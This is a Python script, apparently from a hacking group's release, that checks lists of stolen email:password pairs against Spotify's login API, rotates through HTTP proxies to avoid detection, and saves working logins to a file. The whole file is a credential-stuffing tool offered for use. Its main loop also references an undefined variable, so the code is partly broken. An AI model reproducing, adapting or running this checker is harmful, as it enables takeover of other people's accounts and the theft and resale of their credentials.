import requests
import os
import webbrowser
import time
import concurrent.futures
from random import choice







def failed(email, password,folder_name):
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)
    with open(str(folder_name)+"\\Failed.txt", 'a') as f:
        f.writelines("{}:{}\n".format(email,password))
        


def passed(email, password,folder_name):
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)
    with open(str(folder_name)+"\\Good.txt", "a") as f:
        f.writelines("{}:{}\n".format(email,password))

def get_tockens():
    while True:
        data = requests.get('https://accounts.spotify.com')
        if data.status_code == 200:
            break
    
    return data.cookies.get("csrf_token")

def checker(data,folder_name,i,x,proxy_filename,use_proxies):
    email = data[0]
    password = data[1]
    csrf_token = get_tockens()
    api = requests.Session()
   # cooki =   {"sp_t":"b2a7bff29032940babb0340d9c57658d", "csrf_token" : csrf_token, "sp_ab":"%7B%222019_04_premium_menu%22%3A%22control%22%7D", "_ga":"GA1.2.297041723.1568590622","sp_adid":"9e1fc0b6-d939-453a-be7c-ea9f74fe7574", "sp_last_utm":"%7B%22utm_source%22%3A%22kw-en_brand_contextual_text%22%2C%22utm_medium%22%3A%22paidsearch%22%2C%22utm_campaign%22%3A%22alwayson_mena_kw_premiumbusiness_core_brand%20contextual-desktop%20text%20exact%20kw-en%20google%22%7D", "_gcl_au":"1.1.959631313.1568655406","_scid":"45544064-ae85-4b47-bb48-f080a681705f", "_hjid":"786bf7bc-d028-48d6-ba2e-b4f8f29623ab", "_fbp":"fb.1.1568655409967.1449048628","_sctr":"1|1569272400000","sp_usid":"2cc1b83f-f7f1-4c8a-8120-2ee81f15e814", "spot":"%7B%22t%22%3A1569650829%2C%22m%22%3A%22kw-en%22%2C%22p%22%3A%22premium%22%7D", "_gid":"GA1.2.1861827401.1569650832", "_gat_UA-5784146-31":"1", "_gcl_aw":"GCL.1569650834.EAIaIQobChMIrPff_uzy5AIVVud3Ch14VAdKEAAYASAAEgLaQ_D_BwE","_gcl_dc":"GCL.1569650834.EAIaIQobChMIrPff_uzy5AIVVud3Ch14VAdKEAAYASAAEgLaQ_D_BwE", "_gac_UA-5784146-31":"1.1569650876.EAIaIQobChMIrPff_uzy5AIVVud3Ch14VAdKEAAYASAAEgLaQ_D_BwE", "__bon":"MHwwfDIwNjM3NzI4MTV8ODY2Nzg0NTgyMzB8MXwxfDF8MQ==", "fb_continue":"https%3A%2F%2Fwww.spotify.com%2Fkw-en%2Faccount%2Foverview%2F"}
    cookies = {"fb_continue" : "https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F", "sp_landing" : "play.spotify.com%2F", "sp_landingref" : "https%3A%2F%2Fwww.google.com%2F", "user_eligible" : "0", "spot" : "%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D", "sp_t" : "ac1439ee6195be76711e73dc0f79f89", "sp_new" : "1", "csrf_token" : csrf_token, "__bon" : "MHwwfC0zMjQyMjQ0ODl8LTEzNjE3NDI4NTM4fDF8MXwxfDE=", "remember" : "false@false.com", "_ga" : "GA1.2.153026989.1498061376", "_gid" : "GA1.2.740264023.1498061376"}
    headers = {"User-Agent" : "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4", "Accept" : "application/json, text/plain", "Content-Type": "application/x-www-form-urlencoded"}
    payload = {"remember" : "false", "username" : email, "password" : password, "csrf_token" : csrf_token}
    if use_proxies == "2":
        proxi = randomproxies(proxy_filename)
        
    while True:
        try:
            if use_proxies == "2":
                source = api.post("https://accounts.spotify.com/api/login",data=payload, headers=headers,cookies=cookies, proxies=proxi, timeout=5)
            elif use_proxies == "1":
                source = api.post("https://accounts.spotify.com/api/login",data=payload, headers=headers,cookies=cookies)
            break
        except:
            pass

    print("{}/{}".format(i,x), end="\r")
    if source.content == b'{"error":"errorInvalidCredentials"}':
        
        failed(email,password,folder_name)
    else:
        passed(email,password,folder_name)

def end(xtv):
    print(    "checker has finished")
    print("_______________________________")
    print("Results have been saved in {}".format(xtv))
    print("--------------------------------")    
    print("Checker closing in 5...")
    time.sleep(1)
    print("Checker closing in 4...")
    time.sleep(1)
    print("Checker closing in 3...")
    time.sleep(1)
    print("Checker closing in 2...")
    time.sleep(1)
    print("Checker closing in 1...")


def randomproxies(proxy_file):
    with open(proxy_file, "r") as f:
        proxies = f.readlines()
        cleaned_proxies = [x.rstrip() for x in proxies]
        randomproxy = choice(cleaned_proxies)
        return {
            "http": str(randomproxy)
            }
            
        
    



print(
"""  
 ________________________________________________________________________________
  ----------------------------OVERHAX TEAM-------------------------------------
	CREATED BY:KILLERDRAGON													  
	Discord:https://discord.gg/at5AhJQ										  
	YouTube:https://www.youtube.com/channel/UCrOP8qXw9XmDXuyFDTLVAMQ		  
  -----------------------SUBSCRIBE! | LIKE | COMMENT---------------------------
 ________________________________________________________________________________			                                                                                
"""
    
    )



print("Loading youtube....")
time.sleep(1)
webbrowser.open("https://www.youtube.com/channel/UCrOP8qXw9XmDXuyFDTLVAMQ", new=2, autoraise =False)
print("Loading Discord....")
time.sleep(2)
webbrowser.open("https://discord.gg/at5AhJQ", new=0,autoraise=False)


folder_name = input("Input a folder name to save result :")
use_proxies = input("1:proxyless \n2:http\n")
proxy_file = ""
if use_proxies == "2":
    while True:
        try:
            proxy_file = input("Proxy file name :")
            proxyss = open(proxy_file, "r").readlines()
            break
        except:
            print("Proxy file dosent exist please type the name again :")

while True:
    try:
        combos_name = input("Please enter Combo File name for example (combos.txt) :")
        combos = open(combos_name, "r").readlines()
        break
    except:
            print("you typed the wrong combo name")

arrange = [lines.replace("\n", "") for lines in combos]
i = 0
hits = 0
bad = 0
x = len(arrange)
for lines in arrange:
    i += 1

    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(checker,data[0],data[1])



    data = lines.split(":")
    checker(data,folder_name,i,x,proxy_file, use_proxies)

end(folder_name)